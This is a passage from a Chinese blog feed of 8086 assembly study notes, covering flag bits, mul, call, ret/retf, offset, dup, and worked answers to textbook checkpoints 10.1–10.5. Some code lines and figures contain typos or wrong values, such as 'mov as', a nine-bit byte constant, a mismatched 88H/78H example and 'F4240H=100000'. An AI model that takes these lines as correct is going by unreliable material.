al,1</span><br></pre></td></tr></table></figure></p><p>执行后，结果为10000010B，sf=1，表示：如果指令进行的是有符号数运算，那么结果为负；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,100000001B</span><br><span class="line">add al,011111111B</span><br></pre></td></tr></table></figure></p><p>执行后，结果为0，sf=0，表示：如果指令进行的是有符号数运算，那么结果为非负。<br>某些指令将影响寄存器中的多个标记为，这些被影响的标记位比较全面地记录了指令的执行结果，为相关的处理提供了所需的依据。比如指令sub，al，al执行后，ZF、PF、SF等标志位都要受到影响，它们分别为：1,1,0。</p><h2 id="CF标志位"><a href="#CF标志位" class="headerlink" title="CF标志位"></a>CF标志位</h2><p>flag的第0位是CF，进位标志位，一般情况下，在进行无符号运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。<br>比如，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,98H</span><br><span class="line">add al,al执行后：（al）=30H，CF=1，CF记录了从最高有效位向更高位的进位值</span><br><span class="line">add al,al执行后：（al）=60H，CF=0</span><br></pre></td></tr></table></figure></p><p>而当两个数据做减法的时候，有可能向更高位借位，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,97H</span><br><span class="line">sub al,98H；执行后（al）=FFH，CF=1，CF记录了向更高位的借位值</span><br><span class="line">sub al,al：执行后（al）=0，CF=0，CF记录了向更高位借位值</span><br></pre></td></tr></table></figure></p><h2 id="OF标志位"><a href="#OF标志位" class="headerlink" title="OF标志位"></a>OF标志位</h2><p>flag的第十一位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=0.<br>对于无符号数运算，98+99没有进位，CF=0；<br>对于有符号数运算，98+99发生溢出，OF=1<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,F0H</span><br><span class="line">add al,88H</span><br></pre></td></tr></table></figure></p><p>add指令执行后：CF=1，OF=0.对于无符号运算，F0H+78H有进位，CF=1；<br>对于有符号数运算，F0H+78H不发生溢出，OF=0</p><h2 id="DF标志位"><a href="#DF标志位" class="headerlink" title="DF标志位"></a>DF标志位</h2><p>flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si，di的增减。<br>df=0 每次操作后si、di递增<br>df=1 每次操作后si、di递减</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标志寄存器（简称flag）的作用：&lt;br&gt;（1）用来存储相关指令的某些执行结果。&lt;br&gt;（2）用来为CPU执行相关指令提供行为依据。&lt;br&gt;（3）用来控制CPU的相关工作方式。&lt;br&gt;flag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而fl
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>mul指令</title>
    <link href="https://nocbtm.github.io/2018/09/16/mul%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/16/mul指令/</id>
    <published>2018-09-16T02:58:12.000Z</published>
    <updated>2019-10-01T08:40:58.735Z</updated>
    
    <content type="html"><![CDATA[<p>mul指令是乘法指令<br>规定：<br>（1）两个项城的数，要么都是8位，要么都是16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字单元中：如果是16位，一个默认放在AX中，另一个放在16位reg或内存子单元中。<br>（2）结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认放在DX中存放，低位在AX中放。</p><p>例如：<br>（1）计算100*10<br>100和10 都小于255，可以做8位陈发，程序如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure></p><p>结果（ax）=1000（03E8H）<br>（2）计算100*10000<br>100小于255，可10000大于255，所以必须做16位乘法，程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure></p><p>结果：(ax)=4240H,(dx)=000FH (F4240H=100000)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;mul指令是乘法指令&lt;br&gt;规定：&lt;br&gt;（1）两个项城的数，要么都是8位，要么都是16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字单元中：如果是16位，一个默认放在AX中，另一个放在16位reg或内存子单元中。&lt;br&gt;（2）结果：如果是8位乘法，结果默
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>call指令</title>
    <link href="https://nocbtm.github.io/2018/09/12/call%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/12/call指令/</id>
    <published>2018-09-12T12:12:52.000Z</published>
    <updated>2019-10-01T08:43:29.051Z</updated>
    
    <content type="html"><![CDATA[<p>CPU执行call指令时，进行两步操作：<br>（1）将当前的IP或CS和IP压入栈中；<br>（2）转移<br>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。</p><h2 id="call-标号"><a href="#call-标号" class="headerlink" title="call 标号"></a>call 标号</h2><h3 id="依据位移进行转移的call指令"><a href="#依据位移进行转移的call指令" class="headerlink" title="依据位移进行转移的call指令"></a>依据位移进行转移的call指令</h3><p>CPU执行 “call 标号”指令时，进行如下操作：<br>（1）(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>(2) (IP)=(IP)+16位位移。</p><p>16位位移=标号处的地址-call指令后的第一个直接的地址；<br>16位位移的范围为-32768~32767，用补码表示；<br>16位位移由编译程序在编译时算出。</p><p>CPU执行”call 标号”时，用汇编语言解释，相当于进行：<br>push IP<br>jmp near ptr 标号</p><h2 id="call-far-ptr-标号"><a href="#call-far-ptr-标号" class="headerlink" title="call far ptr 标号"></a>call far ptr 标号</h2><h3 id="转移的目的之地在指令中的call指令"><a href="#转移的目的之地在指令中的call指令" class="headerlink" title="转移的目的之地在指令中的call指令"></a>转移的目的之地在指令中的call指令</h3><p>CPU执行”call far ptr 标号”指令时，进行如下的操作：<br>(1) (sp)=(sp)-2<br>((ss)*16+（sp))=(CS)</p><p>(sp)=(sp)-2<br>((ss)*16+(sp0=（IP）<br>(2)(CS)=标号所在段的段地址<br>（IP）=标号在段中的偏移地址</p><p>CPU执行”call far ptr 标号”时，用汇编语言解释，相当于进行：<br>push CS<br>push IP<br>jmp far ptr 标号</p><h2 id="call-16-位-reg"><a href="#call-16-位-reg" class="headerlink" title="call 16 位 reg"></a>call 16 位 reg</h2><h3 id="转移地址在寄存器中的call指令"><a href="#转移地址在寄存器中的call指令" class="headerlink" title="转移地址在寄存器中的call指令"></a>转移地址在寄存器中的call指令</h3><p>功能：<br>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>(IP)=(16位reg)</p><p>用汇编语言解释，相当于进行：<br>push IP<br>jmp 16位 reg</p><h2 id="call-word-ptr-内存单元地址"><a href="#call-word-ptr-内存单元地址" class="headerlink" title="call word ptr 内存单元地址"></a>call word ptr 内存单元地址</h2><p>转移地址在内存中的call指令</p><p>用汇编语言解释，相当于进行：<br>push IP<br>jmp word ptr 内存单元地址</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov as,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure></p><p>执行后，（IP）=0123H，（sp）=0EH</p><h2 id="call-dword-ptr-内存单元地址"><a href="#call-dword-ptr-内存单元地址" class="headerlink" title="call dword ptr 内存单元地址"></a>call dword ptr 内存单元地址</h2><p>转移地址在内存中的call指令</p><p>用汇编语言解释，相当于进行：<br>push CS<br>push IP<br>jmp word ptr 内存单元地址</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov as,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br></pre></td></tr></table></figure></p><p>执行后，（CS）=0，（IP）=0123H，（sp）=0CH</p><h2 id="call和ret的配合使用"><a href="#call和ret的配合使用" class="headerlink" title="call和ret的配合使用"></a>call和ret的配合使用</h2><p>call和ret配合使用来实现子程序<br>先分析一下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start: mov ax,1</span><br><span class="line">   mov cx,3</span><br><span class="line">   call s</span><br><span class="line">   mov bx,ax</span><br><span class="line">   mov ax,4c00h</span><br><span class="line">   int 21h</span><br><span class="line">    s: add ax,bx</span><br><span class="line">   loops</span><br><span class="line">   ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>CPU执行这个程序的主要过程<br><img alt="" data-src="https://i.imgur.com/hzLJVqo.png" class="lozad"><br>可以写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令去执行。可是执行完子程序后，如何让CPU接着call指令向下执行？call指令去执行子程序之前，call指令后面的指令的地址将存储在栈中，所以可在子程序后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面的代码处继续执行。</p><p>具有子程序的源程序的框架如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">main: :</span><br><span class="line">  :</span><br><span class="line">  call sub1</span><br><span class="line">  :</span><br><span class="line">  :</span><br><span class="line">  mov ax,4c00h</span><br><span class="line">  int 21h</span><br><span class="line">sub1: :</span><br><span class="line">  :</span><br><span class="line">  call sub2</span><br><span class="line">  :</span><br><span class="line">  :</span><br><span class="line">  ret</span><br><span class="line">sub2: :</span><br><span class="line">  :</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end main</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CPU执行call指令时，进行两步操作：&lt;br&gt;（1）将当前的IP或CS和IP压入栈中；&lt;br&gt;（2）转移&lt;br&gt;call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。&lt;/p&gt;
&lt;h2 id=&quot;call-标号&quot;&gt;&lt;a href=&quot;#call
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>检测点10.1-10.5</title>
    <link href="https://nocbtm.github.io/2018/09/12/%E6%A3%80%E6%B5%8B%E7%82%B910-1-10-5/"/>
    <id>https://nocbtm.github.io/2018/09/12/检测点10-1-10-5/</id>
    <published>2018-09-12T12:08:33.000Z</published>
    <updated>2019-10-01T08:29:06.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="10-1"><a href="#10-1" class="headerlink" title="10.1"></a>10.1</h2><p>补全程序，实现从内存1000:0000处开始执行指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">start: mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,0</span><br><span class="line">push ax</span><br><span class="line">mov ax,1000h</span><br><span class="line">retf</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>程序分析：</p><ol><li><p>retf指令作用（CPU角度）：从栈中弹出2个字单元，并修改CS（第二个字）和IP（第一个字）；首先它弹出的是IP，其次是CS，故在压栈时，CS的值首先入栈，IP再入栈。</p><p> 在汇编编程角度，retf实现了远转移。</p></li></ol><p>讲解：在汇编代码这个层次，retf指令作用是修改CS和IP的值，进而使指令从修改后的地址处开始执行。由于它所依赖的是栈中存储的内容，故在压栈过程中要搞清楚入栈的顺序、入栈的值。</p><p>2.熟悉ret指令和RETF指令执行的操作。</p><p>我们编译链接后，debug跟踪check10-1.exe</p><p>-d ss:0</p><p>0B66:0000  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   …………….</p><p>在stack数据区中初始化了16个0，此时它未成为栈结构。直到初始化栈的结构。</p><p>执行代码t t（二次）</p><p>AX=0B66  BX=0000  CX=0026  DX=0000  SP=0010  BP=0000  SI=0000  DI=0000</p><p>DS=0B56  ES=0B56  SS=0B66  CS=0B67  IP=0008   NV UP EI PL NZ NA PO NC</p><p>0B67:0008 B80010        MOV     AX,1000</p><p>-d ss:00</p><p>0B66:0000  00 00 00 00 00 00 66 0B-00 00 08 00 67 0B 68 05   ……f…..g.h.</p><p>初始化一个栈sp=0010H（16），栈地址：ss=0b66，这里我们发现一些不应该有的数据（不理会它，它是中断的信息）</p><p>继续执行代码：</p><p>-d ss:0</p><p>0B66:0000  00 00 00 00 00 00 10 00-67 0B 68 05 00 00 00 10   ……..g.h…..</p><p>发现从高位开始存储10 00 00 00四个字节的数据，（体会栈是从高地址向低地址发展的，sp指针从10H减少到了0cH）</p><p>此时的CS=0B67  IP=0010</p><p>执行retf代码：</p><p>我们发现：CS=1000  IP=0000，CS和IP的值改变了。</p><p>总结：ret和RETF依赖于栈的结构存储一个程序执行点（IP或CS和IP），当执行这个代码时，可以恢复到这个程序的执行点（将栈中的数据修改IP或CS和IP，使CPU指向新的CS：IP）</p><h2 id="10-2"><a href="#10-2" class="headerlink" title="10.2"></a>10.2</h2><p>下面的程序执行后，ax中的数值为多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">内存地址    机器码      汇编指令       执行后情况</span><br><span class="line"></span><br><span class="line">1000:0     b8 00 00     mov ax,0     ax=0 ip指向1000:3</span><br><span class="line"></span><br><span class="line">1000:3     e8 01 00     call s       读取指令后IP指向下一条指令IP为6;push 6</span><br><span class="line"></span><br><span class="line">1000:6     40           inc ax</span><br><span class="line"></span><br><span class="line">1000:7     58         s:pop ax       ax=6</span><br></pre></td></tr></table></figure></p><p> “call 标号”是将该指令后的第一个字节偏移地址入栈，再转到标号处执行指令。</p><h2 id="10-3"><a href="#10-3" class="headerlink" title="10.3"></a>10.3</h2><p>下面的程序执行后，AX中的数值为多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">内存地址        机器码               汇编指令  </span><br><span class="line"></span><br><span class="line">1000：0       b8 00 00             mov ax,0  </span><br><span class="line"></span><br><span class="line">1000：3       9A 09 00 00 10       call far ptr s    ;cs为1000h，ip为8，</span><br><span class="line">                                                      push 1000h，push 8</span><br><span class="line">1000：8       40                   inc ax   </span><br><span class="line">1000：9       58                   s:  pop ax        ;ax=8h  </span><br><span class="line">                                       add ax,ax     ;ax=10h  </span><br><span class="line">                                       pop bx        ;bx=1000h  </span><br><span class="line">                                       add ax,bx     ;ax=1010h</span><br></pre></td></tr></table></figure></p><p>执行call far ptr s时，取IP为8,add ax,ax    ax=16<br>BX=CS=1000H 相加转16进制ax=1010H</p><h2 id="10-4"><a href="#10-4" class="headerlink" title="10.4"></a>10.4</h2><p>下面的程序执行后，AX中的数值为多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">内存地址        机器码          汇编指令   </span><br><span class="line">1000：0       b8 06 00        mov ax,6   </span><br><span class="line">1000：3       ff d0           call ax</span><br><span class="line">1000：5       40              inc ax   </span><br><span class="line">1000：6                       mov bp,sp  </span><br><span class="line">                              add ax,[bp]</span><br></pre></td></tr></table></figure></p><p>在执行了<br>call ax<br>的时候<br>指令寄存器会指向下一条指令的起始地址，也就是<br>1000:5 inc ax<br>然后指令寄存器ip=5要压入堆栈<br>然后跳转到cs:ax指定的地址执行<br>又因为此时ax中的值为6 ,cs=1000<br>所以跳转到1000:6执行<br>于是修改 ip为6<br>到此时call ax指令才执行完毕</p><p>然后就执行<br>mov bp,sp<br>因为sp里面放的是堆顶的地址，所以bp也是栈顶的地址了<br>之后<br>add ax,[bp]<br>因为，bp里面放的是栈顶的地址，所以 [bp] 寄存器寻址后 [bp]实际是代表该地址单元的内容，也就是栈顶的内容，因为先前我把ip压入了堆栈，所以[bp]得到的内容就是5(先前在call ax时候压入的ip的值)</p><p>所以 ax=ax+[bp]<br>也就是 ax=6+5=0BH</p><h2 id="10-5"><a href="#10-5" class="headerlink" title="10.5"></a>10.5</h2><p>题目：下面的程序执行后，ax中的数据是多少？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code </span><br><span class="line">stack segment </span><br><span class="line">dw 8 dup (0) </span><br><span class="line">stack ends </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line">start :mov ax,stack </span><br><span class="line">       mov ss,ax </span><br><span class="line">      mov sp,16        </span><br><span class="line"></span><br><span class="line">      mov ds,ax       </span><br><span class="line">      mov ax,0  </span><br><span class="line">      call word ptr ds:[0eH]     </span><br><span class="line">      inc ax </span><br><span class="line">      inc ax </span><br><span class="line">      inc ax </span><br><span class="line">code ends </span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>解答：刚开始时mov ax,stack到mov sp,10h是分别设置ss：sp指向程序中定义的栈段stack。mov ds,ax也把数据段的段地址也设置成了stack段的段地址。call word prt ds:[0Eh]相当于是sp=sp-2，push ip，jmp word ptr ds:[0Eh]这三条指令。而sp-2就是0Eh了，push ip就是把第一条inc ax对应的ip值给压入栈。存放在ss:[0Eh]和ss:[0Fh]里面。接下来是jmp word ptr ds:[0Eh]了，它的功能就是把stack段的[0eh]子单元的值付给ip，很巧的是stack中[0eh]字单元的值就是刚刚压入的ip值。所以ip值没有改变。程序继续执行inc ax后面的程序。所以ax的值是3.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;10-1&quot;&gt;&lt;a href=&quot;#10-1&quot; class=&quot;headerlink&quot; title=&quot;10.1&quot;&gt;&lt;/a&gt;10.1&lt;/h2&gt;&lt;p&gt;补全程序，实现从内存1000:0000处开始执行指令&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>ret和retf</title>
    <link href="https://nocbtm.github.io/2018/09/12/ret%E5%92%8Cretf/"/>
    <id>https://nocbtm.github.io/2018/09/12/ret和retf/</id>
    <published>2018-09-12T11:44:58.000Z</published>
    <updated>2019-10-01T08:38:54.248Z</updated>
    
    <content type="html"><![CDATA[<p>ret指令用栈中的数据，修改IP的内容，从而实现进转移；<br>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移；</p><p>CPU执行ret指令时，进行下面两步操作：<br>（1） （IP)=((ss)*16+(sp))<br>（2） (sp)=(sp)+2</p><p>CPU执行retf指令时，进行下面4部操作：<br>(1) (IP)=((ss)<em>16+(sp))<br>(2) (sp)=(sp)+2<br>(3) (CS)=((ss)</em>16+(sp))<br>(4) (sp)=(sp)+2</p><p>可以看出，CPU执行ret指令时，相当于进行：<br>pop IP</p><p>CPU执行retf指令时，相当于进行：<br>pop IP<br>pop CS</p><p>例如：<br>1、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">start: mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,0</span><br><span class="line">push ax</span><br><span class="line">mov bx,0</span><br><span class="line">ret</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>ret指令执行后CS：IP指向代码的第一条指令<br>2、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs;code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">start: mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,16</span><br><span class="line">mov ax,0</span><br><span class="line">push cs</span><br><span class="line">push ax</span><br><span class="line">mov bx,0</span><br><span class="line">retf</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>retf指令执行后，CS：IP指向代码段的第一条指令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ret指令用栈中的数据，修改IP的内容，从而实现进转移；&lt;br&gt;retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移；&lt;/p&gt;
&lt;p&gt;CPU执行ret指令时，进行下面两步操作：&lt;br&gt;（1） （IP)=((ss)*16+(sp))&lt;br&gt;（2） (sp)=(sp)
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>操作符offset</title>
    <link href="https://nocbtm.github.io/2018/09/11/%E6%93%8D%E4%BD%9C%E7%AC%A6offset/"/>
    <id>https://nocbtm.github.io/2018/09/11/操作符offset/</id>
    <published>2018-09-11T13:26:03.000Z</published>
    <updated>2019-10-01T08:37:48.878Z</updated>
    
    <content type="html"><![CDATA[<p>操作符offest在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,offset strat      ;相当于mov ax,0</span><br><span class="line">s: mov ax,offset s             ;相当于mov ax,3</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p><p>offset操作符取得了标号start和s的偏移地址0和3<br>因为start是代码段中的标号，它所标记的指令是代码段中的第一条指令，偏移地址为0；<br>而s标记的指令是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3.</p><p>又比如：<img alt="" data-src="https://i.imgur.com/hPg1Fmt.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;操作符offest在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。比如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>dup指令</title>
    <link href="https://nocbtm.github.io/2018/09/11/dup%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/11/dup指令/</id>
    <published>2018-09-11T13:04:52.000Z</published>
    <updated>2019-10-01T08:41:07.392Z</updated>
    
    <content type="html"><![CDATA[<p>dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。<br>dup的使用格式如下：<br>db 重复的次数 dup （重复的字节型数据）<br>dw 重复的次数 dup （重复的字型数据）<br>dd 重复的次数 dup （重复的双字符数据）</p><p>比如：<br>1、<br><figure class="highlight plain"><figcaption><span>3 dup (0)```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">定义了三个字节，它们的值都是0，相当于db 0,0,0。</span><br><span class="line"></span><br><span class="line">2、</span><br></pre></td></tr></table></figure></p><p>stack segment<br>db 200 dup (0)<br>stack ends<br><code>`</code><br>定义了一个容量为200个字节的栈段</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。&lt;br&gt;dup的使用格式如下：&lt;br&gt;db 重复的次数 dup （重复的字节型数据）&lt;br&gt;dw 重复的次数 dup （重复的字型数据）&lt;br&gt;d
      
    
    </summary>
    
